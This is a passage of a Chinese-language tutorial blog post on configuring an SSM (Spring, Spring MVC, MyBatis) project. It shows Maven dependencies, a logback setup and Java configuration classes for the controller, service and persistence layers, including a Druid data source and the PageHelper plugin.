class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        springmvc</span></span><br><span class="line"><span class="comment">        spring-webmvc 6.0.6</span></span><br><span class="line"><span class="comment">        jakarta.jakartaee-web-api 9.1.0</span></span><br><span class="line"><span class="comment">        jackson-databind 2.15.0</span></span><br><span class="line"><span class="comment">        hibernate-validator / hibernate-validator-annotation-processor</span></span><br><span class="line"><span class="comment">        8.0.0.Final</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.platform<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.jakartaee-web-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jakarta.jakartaee-web-api.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- jsp需要依赖! jstl--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jakarta.servlet.jsp.jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jakarta.servlet.jsp.jstl-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jakarta.servlet.jsp.jstl-api.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;jackson-databind.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">https://mvnrepository.com/artifact/org.hibernate.validator/hibernate-</span></span><br><span class="line"><span class="comment">validator --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate.validator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-validator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hibernate-validator.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        https://mvnrepository.com/artifact/org.hibernate.validator/hibernate-</span></span><br><span class="line"><span class="comment">        validator-annotation-processor --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate.validator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-validator-annotation-processor<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hibernate-validator.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        mybatis</span></span><br><span class="line"><span class="comment">        mybatis / 3.5.11</span></span><br><span class="line"><span class="comment">        mysql / 8.0.25</span></span><br><span class="line"><span class="comment">        pagehelper / 5.1.11</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- mybatis依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- MySQL驱动 mybatis底层依赖jdbc驱动实现,本次不需要导入连接池,mybatis自带!</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mysql.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.pagehelper<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>pagehelper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;pagehelper.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 整合第三方特殊依赖 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis-spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 日志 ， 会自动传递slf4j门面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;logback.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;lombok.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;druid.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p>日志文件格式配置：一般各个公司会有自己的标准配置文件。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">debug</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定日志输出的位置，ConsoleAppender表示输出到控制台 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 日志输出的格式 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 按照顺序分别是：时间、日志级别、线程名称、打印日志的类、日志主体内容、换行 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>[%d&#123;HH:mm:ss.SSS&#125;] [%-5level] [%thread] [%logger] [%msg]%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 设置全局日志级别。日志级别按顺序分别是：TRACE、DEBUG、INFO、WARN、ERROR--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定任何一个日志级别都只打印当前级别和后面级别的日志。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定打印日志的appender，这里通过“STDOUT”引用了前面配置的appender --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 根据特殊需求指定局部日志级别，可也是包名或全类名。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;com.atguigu.mybatis&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="控制层配置编写-SpringMVC整合"><a href="#控制层配置编写-SpringMVC整合" class="headerlink" title="控制层配置编写(SpringMVC整合)"></a>控制层配置编写(SpringMVC整合)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&#123;&quot;com.fu.controller&quot;, &quot;com.fu.exceptionHandler&quot;&#125;)</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span>  <span class="comment">// 实现3、6配置</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcJavaConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="comment">// 静态资源处理 可选</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureDefaultServletHandling</span><span class="params">(DefaultServletHandlerConfigurer configurer)</span> &#123;</span><br><span class="line">        configurer.enable();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 视图解析器 可选</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureViewResolvers</span><span class="params">(ViewResolverRegistry registry)</span> &#123;</span><br><span class="line">        registry.jsp(<span class="string">&quot;/WEB-INF/view&quot;</span>, <span class="string">&quot;jsp&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 拦截器 可选</span></span><br><span class="line"><span class="comment">//    @Override</span></span><br><span class="line"><span class="comment">//    public void addInterceptors(InterceptorRegistry registry) &#123;</span></span><br><span class="line"><span class="comment">//        registry.addInterceptor();</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="业务层配置编写-AOP-TX整合）"><a href="#业务层配置编写-AOP-TX整合）" class="headerlink" title="业务层配置编写(AOP &#x2F; TX整合）"></a>业务层配置编写(AOP &#x2F; TX整合）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*@Description: 业务层配置类</span></span><br><span class="line"><span class="comment"> * 1. service</span></span><br><span class="line"><span class="comment"> * 2. 开启AOP注解支持@EnableAspectJAutoProxy  aspect:@Before @After @AfterReturning @AfterThrowing @Around @Aspect @Order</span></span><br><span class="line"><span class="comment"> * 3. tx声明式事务管理：1.对应的事务管理器实现  2.开启事务注解支持(@EnableTransactionManagement) @Transactional</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableAspectJAutoProxy</span></span><br><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.fu.service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServiceJavaConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DataSourceTransactionManager <span class="title function_">transactionManager</span><span class="params">(DataSource dataSource)</span>&#123;</span><br><span class="line">        <span class="type">DataSourceTransactionManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataSourceTransactionManager</span>();</span><br><span class="line">        manager.setDataSource(dataSource);</span><br><span class="line">        <span class="keyword">return</span> manager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="持久层配置编写-MyBatis整合"><a href="#持久层配置编写-MyBatis整合" class="headerlink" title="持久层配置编写(MyBatis整合)"></a>持久层配置编写(MyBatis整合)</h3><h4 id="方式一-不建议）：配置文件-配置类"><a href="#方式一-不建议）：配置文件-配置类" class="headerlink" title="方式一(不建议）：配置文件+配置类"></a>方式一(不建议）：配置文件+配置类</h4><p>保留mybatis-config.xml。依然保留mybatis的外部配置文件（xml）, 但是数据库连接信息交给Druid连接池配置！</p>
<p>配置文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 开启驼峰式映射--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;mapUnderscoreToCamelCase&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 开启logback日志输出--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;logImpl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;SLF4J&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--开启resultMap自动映射 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">setting</span> <span class="attr">name</span>=<span class="string">&quot;autoMappingBehavior&quot;</span> <span class="attr">value</span>=<span class="string">&quot;FULL&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 给实体类起别名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.fu.pojo&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plugin</span> <span class="attr">interceptor</span>=<span class="string">&quot;com.github.pagehelper.PageInterceptor&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">helperDialect：分页插件会自动检测当前的数据库链接，自动选择合适的分页方式。</span></span><br><span class="line"><span class="comment">你可以配置helperDialect属性来指定分页插件使用哪种方言。配置时，可以使用下面的缩写值：</span></span><br><span class="line"><span class="comment">oracle,mysql,mariadb,sqlite,hsqldb,postgresql,db2,sqlserver,informix,h2</span></span><br><span class="line"><span class="comment">,sqlserver2012,derby</span></span><br><span class="line"><span class="comment">（完整内容看 PageAutoDialect） 特别注意：使用SqlServer2012 数据库时，</span></span><br><span class="line"><span class="comment">https://github.com/pagehelper/Mybatis-</span></span><br><span class="line"><span class="comment">PageHelper/blob/master/wikis/zh/HowToUse.md#%E5%A6%82%E4%BD%95%E9%85%8D</span></span><br><span class="line"><span class="comment">%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%B9%E8%A8%80</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;helperDialect&quot;</span> <span class="attr">value</span>=<span class="string">&quot;mysql&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**<span class="doctag">@Description</span>: 持久层配置类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapperJavaConfig</span> &#123;</span><br><span class="line">    <span class="comment">// sqlSessionFactory加入IoC容器</span></span><br><span class="line">    <span class="comment">// 方式1 外部指定mybatis-config.xml【mybatis配置，除连接池外】</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactoryBean <span class="title function_">sqlSessionFactoryBean</span><span class="params">(DataSource dataSource)</span>&#123;</span><br><span class="line">        <span class="type">SqlSessionFactoryBean</span> <span class="variable">sqlSessionFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBean</span>();</span><br><span class="line">        <span class="comment">// 指定配置文件等信息</span></span><br><span class="line">        <span class="comment">// 指定数据库连接池对象</span></span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        <span class="comment">// 指定外部mybatis配置文件</span></span><br><span class="line">        <span class="type">Resource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;mybatis-config.xml&quot;</span>);</span><br><span class="line">        sqlSessionFactoryBean.setConfigLocation(resource);</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mapper代理对象加入IoC容器</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MapperScannerConfigurer <span class="title function_">mapperScannerConfigurer</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// Mapper代理对象的factoryBean --&gt; 将指定包下的mapper接口生成mapper代理对象加入IoC容器，底层需要sqlSessionFactoryBean</span></span><br><span class="line">        <span class="type">MapperScannerConfigurer</span> <span class="variable">mapperScannerConfigurer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MapperScannerConfigurer</span>();</span><br><span class="line">        <span class="comment">// mapper接口和mapper.xml所在共同包</span></span><br><span class="line">        mapperScannerConfigurer.setBasePackage(<span class="string">&quot;com.fu.mapper&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> mapperScannerConfigurer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>连接池配置需要独立文件：如果与上述处在同一文件，会导致@Value注解无法生效，因为mybatis的组件优先加载，而此时@Value注解还无法读取。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PropertySource(&quot;classpath:jdbc.properties&quot;)</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DataSourceConfig</span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;user&#125;)</span><span class="string">&quot;)</span></span><br><span class="line"><span class="string">    private String user;</span></span><br><span class="line"><span class="string">    @Value(&quot;</span>$&#123;password&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    private String password;</span></span><br><span class="line"><span class="string">    @Value(&quot;</span>$&#123;url&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    private String url;</span></span><br><span class="line"><span class="string">    @Value(&quot;</span>$&#123;driver&#125;<span class="string">&quot;)</span></span><br><span class="line"><span class="string">    private String driver;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 连接池</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    @Bean</span></span><br><span class="line"><span class="string">    public DataSource dataSource()&#123;</span></span><br><span class="line"><span class="string">        DruidDataSource dataSource = new DruidDataSource();</span></span><br><span class="line"><span class="string">        dataSource.setUsername(user);</span></span><br><span class="line"><span class="string">        dataSource.setUrl(url);</span></span><br><span class="line"><span class="string">        dataSource.setPassword(password);</span></span><br><span class="line"><span class="string">        dataSource.setDriverClassName(driver);</span></span><br><span class="line"><span class="string">        return dataSource;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>



<h4 id="方式二（完全配置类形式）："><a href="#方式二（完全配置类形式）：" class="headerlink" title="方式二（完全配置类形式）："></a><strong>方式二（完全配置类形式）：</strong></h4><p>连接池配置如上</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 持久层配置类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapperJavaConfig</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// sqlSessionFactory加入IoC容器</span></span><br><span class="line">	<span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SqlSessionFactoryBean <span class="title function_">sqlSessionFactoryBean</span><span class="params">(DataSource dataSource)</span>&#123;</span><br><span class="line">        <span class="type">SqlSessionFactoryBean</span> <span class="variable">sqlSessionFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBean</span>();</span><br><span class="line">        <span class="comment">// 指定数据库连接池对象</span></span><br><span class="line">        sqlSessionFactoryBean.setDataSource(dataSource);</span><br><span class="line">        <span class="comment">// 以代码取代外部mybatis配置文件功能</span></span><br><span class="line">        org.apache.ibatis.session.<span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.apache.ibatis.session.Configuration();</span><br><span class="line">        <span class="comment">// 配置文件setting标签下开启驼峰映射</span></span><br><span class="line">        configuration.setMapUnderscoreToCamelCase(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 配置文件开启日志</span></span><br><span class="line">        configuration.setLogImpl(Slf4jImpl.class);</span><br><span class="line">        configuration.setAutoMappingBehavior(AutoMappingBehavior.FULL);</span><br><span class="line">        sqlSessionFactoryBean.setConfiguration(configuration);</span><br><span class="line">        <span class="comment">// 替代别名标签</span></span><br><span class="line">        sqlSessionFactoryBean.setTypeAliasesPackage(<span class="string">&quot;com.fu.pojo&quot;</span>);</span><br><span class="line">        <span class="comment">// 插件配置</span></span><br><span class="line">        <span class="type">PageInterceptor</span> <span class="variable">pageInterceptor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PageInterceptor</span>();</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        properties.setProperty(<span class="string">&quot;helperDialect&quot;</span>,<span class="string">&quot;mysql&quot;</span>);</span><br><span class="line">        pageInterceptor.setProperties(properties);</span><br><span class="line">        sqlSessionFactoryBean.addPlugins(pageInterceptor);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mapper代理对象加入IoC容器</span></span><br><span class="line">	<span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MapperScannerConfigurer <span class="title function_">mapperScannerConfigurer</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// Mapper代理对象的factoryBean --&gt; 将指定包下的mapper接口生成mapper代理对象加入IoC容器，底层需要sqlSessionFactoryBean</span></span><br><span class="line">        <span class="type">MapperScannerConfigurer</span> <span class="variable">mapperScannerConfigurer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 